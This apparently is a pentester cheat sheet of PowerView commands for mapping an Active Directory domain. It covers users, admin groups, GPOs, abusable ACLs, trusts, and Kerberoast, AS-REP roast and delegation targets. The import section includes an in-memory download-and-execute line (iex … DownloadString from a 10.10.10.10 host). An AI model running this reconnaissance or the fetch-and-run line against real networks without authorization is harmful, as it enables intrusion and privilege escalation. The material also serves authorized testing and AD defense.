---
description: >-
  Extra:
  https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/ad-attack/domain-enumeration/powerview
---

# PowerView

## Import-Module

```powershell
Import-Module PowerView.ps1
. .\PowerView.ps1
iex(new-object net.webclient).DownloadString('http://10.10.10.10/PowerView.ps1')
```

## Get-Domain

```powershell
Get-Domain
Get-Domain -Domain vulnableone.local
```

## Get-DomainSID

```powershell
Get-DomainSID
Get-DomainSID -Domain vulnableone.local
```

## Get-DomainController

```powershell
Get-DomainController | select Forest, Name, OSVersion | fl
Get-DomainController -Domain vulnableone.local
```

## Get-DomainPolicyData

```powershell
Get-DomainPolicyData | select -expand SystemAccess
(Get-DomainPolicyData).KerberosPolicy
(Get-DomainPolicyData -Domain techcorp.local).KerberosPolicy
```

## Get-DomainUser

```powershell
Get-DomainUser | select samaccountname, pwdlastset, logoncount
Get-DomainUser -Identity khan.chanthou -Properties DisplayName, MemberOf | fl
Get-DomainUser -LDAPFilter "Description=*built*" | select name, Description
Get-DomainUser -LDAPFilter "name=*admin*" | select name, Description
```

## Get-DomainComputer

```powershell
Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName
Get-DomainComputer -OperatingSystem "Windows Server 2019*"
Get-DomainComputer -OperatingSystem "Windows 11*"
Get-DomainComputer -Ping
```

## Get-DomainOU

```powershell
Get-DomainOU -Properties Name | sort -Property Name
Get-DomainOU | select name, gplink
(Get-DomainOU).distinguishedname | %{Get-DomainComputer -SearchBase $_} | Get-DomainGPOComputerLocalGroupMapping
(Get-DomainOU -Identity Sales).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
```

## Get-DomainGroup

```powershell
Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName
Get-DomainGroup *admin* | select name
Get-DomainGroup -Domain vulnableone.local | where Name -like "*Admins*" | select SamAccountName
Get-DomainGroup *admin* -Domain vulnableone.local | select name
Get-DomainGroup -UserName khan.chanthou | select name
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName
Get-NetLocalGroup -ComputerName WST1    #LocalAdmin
Get-NetLocalGroupMember -ComputerName WST1    #LocalAdmin
Get-NetLocalGroupMember -ComputerName WST1 -GroupName Administrators    #LocalAdmin
```

## Get-DomainGPO

```powershell
Get-DomainGPO -Properties DisplayName | sort -Property DisplayName
Get-DomainGPO -ComputerIdentity WST1 -Properties DisplayName | sort -Property DisplayName
Get-DomainGPO -Identity '{6AC1786C-016F-11D2-945F-00C04fB984F9}'
```

## Get-DomainGPOLocalGroup



```powershell
Get-DomainGPOLocalGroup | select GPODisplayName, GroupName
```

## Get-DomainGPOUserLocalGroupMapping

This is useful for finding where domain groups have local admin access.

```powershell
Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl
Get-DomainGPOUserLocalGroupMapping -Identity khan.chanthou -Verbose
```

## Get-DomainObjectACL

```powershell
Get-DomainObjectAcl -Identity khan.chanthou -ResolveGUIDs
Get-DomainObjectAcl -Searchbase "LDAP://CN=Domain Admins,CN=Users,DC=vulnableone,DC=local" -ResolveGUIDs -Verbose
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose
Find-InterestingDomainAcl
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "khan.chanthou"}
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "IT_Groups"}
```

### GenericAll

Users

{% code overflow="wrap" %}
```powershell
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.ActiveDirectoryRights -eq $("GenericAll")) {$_}}
```
{% endcode %}

Group

{% code overflow="wrap" %}
```powershell
Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}                                                                                    
```
{% endcode %}

### GenericWrite

User

{% code overflow="wrap" %}
```powershell
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.ActiveDirectoryRights -like '*GenericWrite*' } | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```
{% endcode %}

Computer

{% code overflow="wrap" %}
```powershell
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.ActiveDirectoryRights -like '*GenericWrite*' }
```
{% endcode %}

## Get-DomainTrust

```powershell
Get-DomainTrust
Get-DomainTrust -Domain vulnableone.local
```

## Get-ForestDomain

```powershell
Get-Forest
Get-ForestDomain
Get-ForestGlobalCatalog
Get-ForestTrust
Get-ForestTrust -Forest vulnableone.local
# External Trust
Get-ForestDomain -Verbose | Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'}
```

## Kerberoast

```powershell
Get-DomainUser -SPN | select serviceprincipalname
```

## ASREPRoast

```powershell
Get-DomainUser -PreauthNotRequired
```

## Unconstrained Delegation

```powershell
Get-DomainComputer -Unconstrained
Get-DomainUser -UACFilter TRUSTED_FOR_DELEGATION -Properties distinguishedname
```

## Constrained Delegation

```powershell
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto, useraccountcontrol 
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto, useraccountcontrol 
```

## Find-DomainShare

```powershell
Find-DomainShare -CheckShareAccess
```

## Find-LocalAdminAccess

```powershell
Find-LocalAdminAccess -Verbose
```
